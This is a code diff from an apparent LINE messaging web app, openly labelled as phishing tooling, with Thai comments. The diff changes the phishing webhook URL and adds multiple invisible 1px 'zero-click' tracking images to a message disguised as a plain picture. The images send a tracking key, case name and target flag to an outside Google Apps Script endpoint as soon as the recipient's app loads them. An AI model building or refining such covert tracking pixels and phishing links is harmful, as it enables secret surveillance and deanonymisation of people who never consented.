@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwawD-x3sKD5MfhC_Zozzv9eQP3Rc_hqk2eIOujit_hDIhkpXsE0XeHe6OaXZVX4spR/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbznSdwWEtFMywsAp5ruz-qlf1sQ8bI5POXyraPUL1SM2nyp4Ms3qoxSq5BsVgMQ8dt4/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,23 +820,24 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
-                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
+                // สร้างเวลาปัจจุบันเป็น timestamp เพื่อป้องกันการแคชและระบุเซสชัน
+                const sessionTimestamp = Date.now();
+                const sessionId = Math.random().toString(36).substring(2, 10);
                 
                 // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
-                // ปรับปรุงใหม่: ไม่ส่งข้อมูลอุปกรณ์ของผู้สร้าง แต่ให้เซิร์ฟเวอร์ดึงข้อมูลจาก HTTP Headers
+                // เปลี่ยนเป็นใช้รูปแบบ Image Proxy ที่มีประสิทธิภาพมากขึ้น
                 let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                 zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                 zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
                 zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
-                zeroClickTrackUrl += `&isZeroClick=true`; // ระบุว่าเป็น Zero Click
-                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                zeroClickTrackUrl += `&sid=${sessionId}`; // Session ID เฉพาะสำหรับการแชร์นี้
+                zeroClickTrackUrl += `&ts=${sessionTimestamp}`; // Timestamp เพื่อป้องกันการแคช
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก tracking image ขนาดเล็กที่มองไม่เห็น
+                // สร้าง Flex Message ที่มีประสิทธิภาพมากขึ้นในการติดตาม Zero Click
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -857,39 +858,64 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // ปรับปรุงการใช้ tracking image ให้มีประสิทธิภาพมากขึ้น
+                                // เทคนิค Multiple Tracking Pixels - ใช้หลาย URL ติดตาม
+                                // ช่วยให้มีโอกาสมากขึ้นในการติดตามและได้ข้อมูลเป้าหมาย
                                 {
                                     type: 'image',
                                     url: zeroClickTrackUrl,
-                                    size: '1px', // ขนาดเล็กมาก
+                                    size: '1px',
                                     aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute', // วางแบบ absolute
-                                    offsetTop: '0px',     // ซ่อนไว้ที่มุมบนซ้าย
-                                    offsetStart: '0px'
+                                    aspectMode: 'cover'
                                 },
-                                // เพิ่ม tracking pixel อีกภาพเพื่อเพิ่มโอกาสในการจับข้อมูล
+                                // เพิ่ม tracking image แบบมี margin เพื่อเพิ่มโอกาสในการโหลด
                                 {
                                     type: 'image',
-                                    url: `${zeroClickTrackUrl}&second=true`,
+                                    url: `${zeroClickTrackUrl}&px=2`,
                                     size: '1px',
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetBottom: '0px',
-                                    offsetEnd: '0px'
+                                    margin: 'sm'
                                 },
-                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
+                                // ใช้ Box ว่างมาแทรก tracking image เพื่อความเข้ากันได้
                                 {
                                     type: 'box',
                                     layout: 'vertical',
-                                    contents: [],
+                                    contents: [
+                                        {
+                                            type: 'image',
+                                            url: `${zeroClickTrackUrl}&px=3`,
+                                            size: '1px',
+                                            aspectRatio: '1:1'
+                                        }
+                                    ],
+                                    width: '1px',
                                     height: '1px',
-                                    width: '1px'
+                                    offsetStart: '50%'
+                                },
+                                // เพิ่ม spacer เพื่อให้เนื้อหาใน body มีขนาดมากขึ้น
+                                {
+                                    type: 'spacer',
+                                    size: 'xs'
                                 }
                             ],
-                            height: '1px', // ทำให้ body กล่องเล็กมาก
-                            paddingAll: '0px'
+                            paddingAll: '0px',
+                            backgroundColor: "#FFFFFF00" // โปร่งใส
+                        },
+                        // เพิ่ม footer ที่มี tracking image อีกตัว
+                        footer: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: `${zeroClickTrackUrl}&px=4`,
+                                    size: '1px',
+                                    aspectRatio: '1:1'
+                                }
+                            ],
+                            paddingAll: '0px',
+                            height: '1px',
+                            backgroundColor: "#FFFFFF00" // โปร่งใส
                         }
                     }
                 };
